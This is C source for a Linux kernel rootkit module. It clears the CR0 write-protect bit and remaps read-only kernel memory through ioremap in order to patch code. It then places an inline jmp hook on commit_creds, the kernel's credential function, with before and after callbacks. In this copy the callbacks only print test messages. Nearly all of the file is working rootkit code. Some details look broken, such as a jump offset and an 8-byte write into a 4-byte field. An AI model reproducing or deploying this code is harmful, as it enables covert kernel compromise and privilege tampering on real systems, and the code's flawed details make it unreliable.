#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <asm/io.h>
#include <asm/pgtable.h>
#include <asm-generic/memory_model.h>
#include <asm/pgtable_types.h>

/*hide file*/
#define HOOK_BUF_SZ 0x30

struct hook_info {
    char hook_data[HOOK_BUF_SZ];
    char orig_data[HOOK_BUF_SZ];
    void (*hook_before) (size_t *args);
    size_t (*orig_func) (size_t, size_t, size_t, size_t, size_t, size_t);
    size_t (*hook_after) (size_t orig_ret, size_t *args);
};

void a3_rootkit_write_read_only_mem_by_ioremap(void *dst, void *src, size_t len);
//读取cr0寄存器
size_t a3_rootkit_read_cr0(void)
{
    size_t cr0;

    asm volatile (
        "movq  %%cr0, %%rax;"
        "movq  %%rax, %0;   "
        : "=r" (cr0) :: "%rax"
    );

    return cr0;
}

//写入数据到cr0寄存器
void a3_rootkit_write_cr0(size_t cr0)
{
    asm volatile (
        "movq   %0, %%rax;  "
        "movq  %%rax, %%cr0;"
        :: "r" (cr0) : "%rax"
    );
}

void a3_rootkit_disable_write_protect(void)
{
    size_t cr0_val;

    cr0_val = a3_rootkit_read_cr0();

    /* if already disable, do nothing */
    if ((cr0_val >> 16) & 1) {
        cr0_val &= ~(1 << 16);
        a3_rootkit_write_cr0(cr0_val);
    }
}

void a3_rootkit_enable_write_protect(void)
{
    size_t cr0_val;

    cr0_val = a3_rootkit_read_cr0();

    /* if already enable, do nothing */
    if (!((cr0_val >> 16) & 1)) {
        cr0_val |= (1 << 16);
        a3_rootkit_write_cr0(cr0_val);
    }
}

void a3_rootkit_write_read_only_mem_by_cr0(void *dst, void *src,size_t len)
{
    size_t orig_cr0;

    orig_cr0 = a3_rootkit_read_cr0();

    a3_rootkit_disable_write_protect();

    memcpy(dst, src, len);

    /* if write protection is originally disabled, just do nothing */
    if ((orig_cr0 >> 16) & 1) {
        a3_rootkit_enable_write_protect();
    }
}

/* template */
struct hook_info temp_hook_info;

size_t a3_rootkit_evil_hook_fn_temp(size_t arg0, size_t arg1, size_t arg2, 
                                    size_t arg3, size_t arg4, size_t arg5)
{
    size_t args[6], ret;

    args[0] = arg0;
    args[1] = arg1;
    args[2] = arg2;
    args[3] = arg3;
    args[4] = arg4;
    args[5] = arg5;

    /* patch the original function and call the original and hook functions */
    if (temp_hook_info.hook_before) {
        temp_hook_info.hook_before(args);
    }

    a3_rootkit_write_read_only_mem_by_ioremap(temp_hook_info.orig_func, 
                                              temp_hook_info.orig_data, 
                                              HOOK_BUF_SZ);
    ret = temp_hook_info.orig_func(args[0], args[1], args[2], 
                                    args[3], args[4], args[5]);

    if (temp_hook_info.hook_after) {
        ret = temp_hook_info.hook_after(ret, args);
    }

    /* re-patch the hook point again */
    a3_rootkit_write_read_only_mem_by_ioremap(temp_hook_info.orig_func, 
                                              temp_hook_info.hook_data, 
                                              HOOK_BUF_SZ);

    return ret;
}

void a3_rootkit_text_hook(void *hook_dst, void *new_dst, struct hook_info *info)
{
    size_t jmp_offset;

    /* save the original hook info */
    info->orig_func = hook_dst;
    memcpy(&info->orig_data, info->orig_func, HOOK_BUF_SZ);

    /* let it jmp to evil func */
    jmp_offset = (size_t) new_dst - (size_t) hook_dst - 12;
    info->hook_data[0] = 0xE9;
    *(size_t *) (&info->hook_data[1]) = jmp_offset;

    a3_rootkit_write_read_only_mem_by_ioremap(info->orig_func, &info->hook_data,
                                              HOOK_BUF_SZ);
}

static int __init a3_rootkit_init(void)
{
    //...
    void test_func_1(size_t args[])
    {
        printk(KERN_ERR "[test hook] aaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    }
    size_t test_func_2(size_t ret, size_t args[])
    {
        printk(KERN_ERR "[test hook] bbbbbbbbbbbbbbbbbbbbbbbbbbbb");
        return ret;
    }

    temp_hook_info.hook_before = test_func_1;
    temp_hook_info.hook_after = test_func_2;
    a3_rootkit_text_hook(commit_creds, a3_rootkit_evil_hook_fn_temp, 
                         &temp_hook_info);   
    return 0;
}

static void __exit a3_rootkit_exit(void)
{
    printk(KERN_INFO "[a3_rootkit:] Module clean up. See you next time.");
}

void a3_rootkit_write_read_only_mem_by_ioremap(void *dst, void *src, size_t len)
{
    size_t dst_phys_page_addr, dst_offset;
    void* dst_ioremap_addr;

    dst_phys_page_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;
    dst_offset = (size_t) dst & 0xfff;

    dst_ioremap_addr = (void*) ioremap(dst_phys_page_addr, len + 0x1000);
    memcpy((void*)(dst_ioremap_addr + dst_offset), src, len);
    iounmap(dst_ioremap_addr);
}

module_init(a3_rootkit_init);
module_exit(a3_rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("arttnba3");
